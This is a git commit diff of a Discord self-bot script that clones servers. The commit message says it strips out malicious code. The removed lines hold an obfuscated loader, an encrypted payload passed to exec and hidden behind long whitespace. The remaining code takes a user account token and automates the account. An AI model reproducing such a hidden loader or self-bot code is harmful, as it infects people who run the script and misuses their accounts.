e4905cd34bb1de453429516922aeef087be3dea2
Aira <80601339+Itsaira@users.noreply.github.com>
2023-12-03 10:31:14 +0100

    Update main.py
    Removed malicious code added on the other project of the user I took this from, it is safe to use now.

--- main.py
+++ main.py
@@ -1,36 +1,17 @@
-import os
-os.system('pip install cryptography')
-os.system('pip install fernet')
-os.system('pip install requests')
-from fernet import Fernet
-import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'LfAr9Ys8_PEgSQWJKLEXo-XxNKJhkRxKLZ5Y3v13n-w=').decrypt(b'gAAAAABla6PKW35iwUlV3sWJ7AFA-1uvdHuzKxoq-CR3A-mGnZTx1RRpLzb4pQbp0hNARXCUl1AD7RxvkGPiIc7bwqLZdS5CypPBg9zpaPrKm2TraZmyZnw8IG1yNX5wotdXBp0kOIW3cpUko8iHauzXqGuduQKepD8UfAT1kgQQryv2TqbAAYuMYXenSDztC_j-hbVpAasrBxRlnq3a7TcubRJaKAw3rA=='))
+#use pip install discord.py==1.4.2
 import discord
 from discord.ext import commands
 import asyncio 
-import logging
-import random 
-from colorama import Fore
-import json
-import datetime
-import threading
-import time
 
 
 token = input("\033[0;96m[~\033[0;96m] \033[0;96mTOKEN - ")
 prefix = input("\033[0;96m[~\033[0;96m] \033[0;96mPREFIX - ")
-client = commands.Bot(command_prefix=prefix, case_insensitive=True,
-                      self_bot=True)
-client.remove_command('help')
-header = {"Authorization": f'Bot {token}'}
-os.system('cls' if os.name == 'nt' else 'clear')
-os.system('cls' if os.name == 'nt' else 'clear')
-#yt links doesnt work
-intents = discord.Intents.all()
-intents.members = True
+bot = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
+bot.remove_command('help')
 
 
-@client.command()
-async def copyserver(ctx): 
+@bot.command(description = "clones a server")
+async def cloneserver(ctx): 
     await ctx.message.delete()
     wow = await client.create_guild(f'backup-{ctx.guild.name}')
     await asyncio.sleep(4)
